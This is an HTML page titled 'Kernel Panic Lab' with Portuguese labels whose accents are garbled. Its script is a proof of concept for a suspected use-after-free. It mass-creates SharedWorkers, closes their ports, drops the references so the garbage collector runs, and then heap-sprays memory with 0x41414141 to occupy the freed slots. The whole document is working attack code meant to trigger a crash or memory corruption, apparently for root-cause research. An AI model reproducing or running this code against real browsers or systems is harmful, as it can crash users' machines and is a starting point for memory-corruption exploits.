<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Kernel Panic Lab</title>
    <style>
        body { background: #222; color: #eee; font-family: sans-serif; padding: 20px; }
        .control-panel { background: #333; padding: 15px; border-radius: 8px; border: 1px solid #555; }
        button { font-size: 18px; padding: 10px 20px; background: #d32f2f; color: white; border: none; cursor: pointer; margin-top: 10px; width: 100%; }
        button:hover { background: #b71c1c; }
        label { display: block; margin: 10px 0; font-size: 16px; }
        input[type="number"] { padding: 5px; width: 100px; }
        #log { background: #000; color: #0f0; padding: 10px; height: 300px; overflow-y: scroll; margin-top: 20px; font-family: monospace; border: 1px solid #444; }
    </style>
</head>
<body>

    <h1>üî¨ Laborat√≥rio de Causa Raiz</h1>

    <div class="control-panel">
        <label>
            Quantidade de Workers:
            <input type="number" id="workerCount" value="1000">
        </label>
        
        <label>
            <input type="checkbox" id="doClose" checked> Executar .port.close() (Gatilho de Destrui√ß√£o)
        </label>

        <label>
            <input type="checkbox" id="doNull" checked> Remover Refer√™ncias (workers = null)
        </label>

        <label>
            <input type="checkbox" id="doSpray" checked> Injetar Heap Spray (0x41414141)
        </label>

        <button onclick="runTest()">RODAR TESTE</button>
    </div>

    <div id="log">Logs aparecer√£o aqui...</div>

    <script>
        let workers = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML = `> ${msg}\n` + el.innerHTML;
        }

        function runTest() {
            const count = parseInt(document.getElementById('workerCount').value);
            const doClose = document.getElementById('doClose').checked;
            const doNull = document.getElementById('doNull').checked;
            const doSpray = document.getElementById('doSpray').checked;

            log(`=== INICIANDO TESTE COM ${count} WORKERS ===`);

            if (!window.SharedWorker) return log("SharedWorker n√£o suportado.");

            // FASE 1: ALOCA√á√ÉO
            log("Criando workers...");
            workers = [];
            try {
                for(let i=0; i<count; i++) {
                    const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "ktest_" + Date.now() + "_" + i);
                    sw.port.start();
                    workers.push(sw);
                }
            } catch(e) {
                return log("Erro na cria√ß√£o: " + e.message);
            }

            log(`${workers.length} criados. Iniciando gatilhos em 200ms...`);

            setTimeout(() => {
                // FASE 2: DESTRUI√á√ÉO (O Gatilho Principal)
                if (doClose) {
                    log("Executando .port.close()...");
                    for(let w of workers) w.port.close();
                } else {
                    log("PULANDO .port.close()");
                }

                // FASE 3: LIMPEZA DE REFER√äNCIA (Para o GC)
                if (doNull) {
                    log("Anulando refer√™ncias (workers = null)...");
                    workers = null;
                }

                // FASE 4: HEAP SPRAY (Ocupar o lugar do morto)
                if (doSpray) {
                    log("Injetando Spray (ocupando mem√≥ria)...");
                    try {
                        const spray = [];
                        const chunk = new Uint32Array(1024 * 64).fill(0x41414141); // 256KB
                        for(let i=0; i<400; i++) spray.push(chunk.slice(0));
                    } catch(e) { log("Spray OOM (Normal)."); }
                }

                log("Ciclo conclu√≠do. Aguardando rea√ß√£o do Kernel...");
            }, 200);
        }
    </script>
</body>
</html>






